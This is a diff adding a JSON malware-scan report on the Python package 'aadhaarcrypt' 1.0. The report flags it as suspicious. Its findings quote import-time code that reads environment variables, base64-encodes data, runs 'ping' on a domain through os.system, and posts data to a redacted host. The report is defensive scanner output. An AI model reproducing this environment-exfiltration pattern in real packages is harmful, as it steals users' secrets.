@@ -1,0 +1,599 @@
+{
+  "created_at": "2026-11-07T10:48:58Z",
+  "files": [
+    {
+      "inspected": true,
+      "kind": "metadata",
+      "lines": null,
+      "path": "AadhaarCrypt-1.0/AadhaarCrypt.egg-info/PKG-INFO",
+      "roles": [],
+      "sha256": "845c72882c9d036767932e02c76353981dc61f62daac47dbbe48104ba8b277d3"
+    },
+    {
+      "inspected": true,
+      "kind": "metadata",
+      "lines": null,
+      "path": "AadhaarCrypt-1.0/AadhaarCrypt.egg-info/SOURCES.txt",
+      "roles": [],
+      "sha256": "9af22ad9ef687320f1869dd15ae8dc01380fea004a8678498e68fb335c49bf03"
+    },
+    {
+      "inspected": true,
+      "kind": "metadata",
+      "lines": null,
+      "path": "AadhaarCrypt-1.0/AadhaarCrypt.egg-info/dependency_links.txt",
+      "roles": [],
+      "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
+    },
+    {
+      "inspected": true,
+      "kind": "metadata",
+      "lines": null,
+      "path": "AadhaarCrypt-1.0/AadhaarCrypt.egg-info/top_level.txt",
+      "roles": [],
+      "sha256": "798e0b2e6828bfa4f79142fefdd2faad8f638931328b36ba87e07409419d177b"
+    },
+    {
+      "inspected": true,
+      "kind": "python",
+      "lines": 105,
+      "path": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "roles": [
+        "package_init"
+      ],
+      "sha256": "0c1a6aec7a23571b595d0989e30d109fbf1fdc6567a4fdb9c203faaf60c5e9eb"
+    },
+    {
+      "inspected": true,
+      "kind": "metadata",
+      "lines": null,
+      "path": "AadhaarCrypt-1.0/PKG-INFO",
+      "roles": [],
+      "sha256": "845c72882c9d036767932e02c76353981dc61f62daac47dbbe48104ba8b277d3"
+    },
+    {
+      "inspected": true,
+      "kind": "build_config",
+      "lines": 4,
+      "path": "AadhaarCrypt-1.0/setup.cfg",
+      "roles": [],
+      "sha256": "1c473cbaee8da5fc46e7f0158794af5cea4414c34a3cf3f180c2001f5e38bd3e"
+    },
+    {
+      "inspected": true,
+      "kind": "python",
+      "lines": 2,
+      "path": "AadhaarCrypt-1.0/setup.py",
+      "roles": [],
+      "sha256": "c9f68dc03ff0f1ccfd3e8f75da7f975899d86b5b358e40b4138f45f8de3565e1"
+    }
+  ],
+  "findings": [
+    {
+      "category": "credential_access",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "os.environ access detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F001",
+      "indicator": "os.environ",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "cred.environ",
+      "severity": "high",
+      "snippet": "os.environ",
+      "span": {
+        "end_col": 29,
+        "end_line": 16,
+        "start_col": 19,
+        "start_line": 16
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "obfuscation",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "base64 operation detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F002",
+      "indicator": "base64.b64encode",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "obf.base64",
+      "severity": "medium",
+      "snippet": "base64.b64encode(data.encode())",
+      "span": {
+        "end_col": 41,
+        "end_line": 34,
+        "start_col": 10,
+        "start_line": 34
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "command_execution",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "os.system() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F003",
+      "indicator": "os.system",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "cmd.os_system",
+      "severity": "high",
+      "snippet": "os.system(\"ping %s\" % domain)",
+      "span": {
+        "end_col": 33,
+        "end_line": 50,
+        "start_col": 4,
+        "start_line": 50
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "command_execution",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "os.system() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F004",
+      "indicator": "os.system",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "cmd.os_system",
+      "severity": "high",
+      "snippet": "os.system(\"ping %s\" % domain)",
+      "span": {
+        "end_col": 37,
+        "end_line": 61,
+        "start_col": 8,
+        "start_line": 61
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "network_activity",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "urllib.request.urlopen() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F005",
+      "indicator": "urllib.request.urlopen",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "net.urlopen",
+      "severity": "medium",
+      "snippet": "urllib.request.urlopen(\"<redacted-host>\" % http_domain, data=data_post.encode(), timeout=10)",
+      "span": {
+        "end_col": 96,
+        "end_line": 73,
+        "start_col": 8,
+        "start_line": 73
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "network_activity",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "urllib.request.urlopen() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F006",
+      "indicator": "urllib.request.urlopen",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "net.urlopen",
+      "severity": "medium",
+      "snippet": "urllib.request.urlopen(\"<redacted-host>\" % (http_domain, data_get), timeout=10)",
+      "span": {
+        "end_col": 88,
+        "end_line": 79,
+        "start_col": 8,
+        "start_line": 79
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "network_activity",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "requests.post() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F007",
+      "indicator": "requests.post",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "net.requests_post",
+      "severity": "medium",
+      "snippet": "requests.post(\"<redacted-host>\" % http_domain, data=data_post, timeout=10)",
+      "span": {
+        "end_col": 78,
+        "end_line": 85,
+        "start_col": 8,
+        "start_line": 85
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "network_activity",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "requests.get() call detected",
+      "file": "AadhaarCrypt-1.0/AadhaarCrypt/__init__.py",
+      "id": "F008",
+      "indicator": "requests.get",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "net.requests_get",
+      "severity": "medium",
+      "snippet": "requests.get(\"<redacted-host>\" % (http_domain, data_get), timeout=10)",
+      "span": {
+        "end_col": 78,
+        "end_line": 91,
+        "start_col": 8,
+        "start_line": 91
+      },
+      "trigger_phase": "import"
+    },
+    {
+      "category": "install_time",
+      "confidence": "high",
+      "context": {
+        "after_normalization": false,
+        "enclosing_function": null,
+        "in_vendored_path": false
+      },
+      "evidence_class": "static_indicator",
+      "explanation": "setuptools.setup() call detected",
+      "file": "AadhaarCrypt-1.0/setup.py",
+      "id": "F009",
+      "indicator": "setuptools.setup",
+      "limitations": [
+        "Static pattern match; no execution was performed."
+      ],
+      "rule_id": "inst.plain_setup",
+      "severity": "low",
+      "snippet": "setup(name = \"AadhaarCrypt\", version = \"1.0\", packages = find_packages())",
+      "span": {
+        "end_col": 73,
+        "end_line": 2,
+        "start_col": 0,
+        "start_line": 2
+      },
+      "trigger_phase": "install"
+    }
+  ],
+  "inventory": {
+    "coverage_known": true,
+    "files_inspected": 8,
+    "files_total": 8,
+    "limits_hit": [],
+    "parse_failures": [],
+    "python_files": 2,
+    "uninspected": [],
+    "vendored_paths": []
+  },
+  "model_assessment": {
+    "calibrated": false,
+    "illustrative": false,
+    "label": null,
+    "model_name": null,
+    "model_version": null,
+    "note": null,
+    "score": null,
+    "status": "not_run",
+    "top_features": []
+  },
+  "record_origin": "replay",
+  "relations": [
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R001",
+      "to": "F002",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R002",
+      "to": "F003",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R003",
+      "to": "F004",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R004",
+      "to": "F005",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R005",
+      "to": "F006",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R006",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F001",
+      "id": "R007",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R008",
+      "to": "F003",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R009",
+      "to": "F004",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R010",
+      "to": "F005",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R011",
+      "to": "F006",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R012",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F002",
+      "id": "R013",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F003",
+      "id": "R014",
+      "to": "F004",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F003",
+      "id": "R015",
+      "to": "F005",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F003",
+      "id": "R016",
+      "to": "F006",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F003",
+      "id": "R017",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F003",
+      "id": "R018",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F004",
+      "id": "R019",
+      "to": "F005",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F004",
+      "id": "R020",
+      "to": "F006",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F004",
+      "id": "R021",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F004",
+      "id": "R022",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F005",
+      "id": "R023",
+      "to": "F006",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F005",
+      "id": "R024",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F005",
+      "id": "R025",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F006",
+      "id": "R026",
+      "to": "F007",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F006",
+      "id": "R027",
+      "to": "F008",
+      "type": "co_occurrence"
+    },
+    {
+      "basis": "co-occur in same file",
+      "confidence": "medium",
+      "from": "F007",
+      "id": "R028",
+      "to": "F008",
+      "type": "co_occurrence"
+    }
+  ],
+  "scan_id": "22b24e2e-5861-47a1-9ef8-9bba9117612e",
+  "schema_version": "0.1",
+  "target": {
+    "artifact": {
+      "filename": "aadhaarcrypt-1.0.tar.gz",
+      "format": "tar.gz",
+      "sha256": "4b28a7fe61e774b04aecbaeb98d06eaf9fc620cd7c873c318e5f6d53f39d7cf3",
+      "size_bytes": 3228
+    },
+    "hash_verified": null,
+    "kind": "archive",
+    "name": "aadhaarcrypt",
+    "version": "1.0"
+  },
+  "timings_ms": {
+    "acquire": null,
+    "analyze": null,
+    "extract": null,
+    "features": null,
+    "model": null
+  },
+  "tool": {
+    "analyzer_version": "analyzer-v1.1",
+    "ruleset_version": "rules-v1.1",
+    "spider_version": "0.1.0-dev"
+  },
+  "verdict": {
+    "limitations": [
+      "Static analysis only: 'none detected in this scan' does not mean the package is safe."
+    ],
+    "outcome": "suspicious",
+    "reasons": [
+      "S4_env_post"
+    ]
+  }
+}
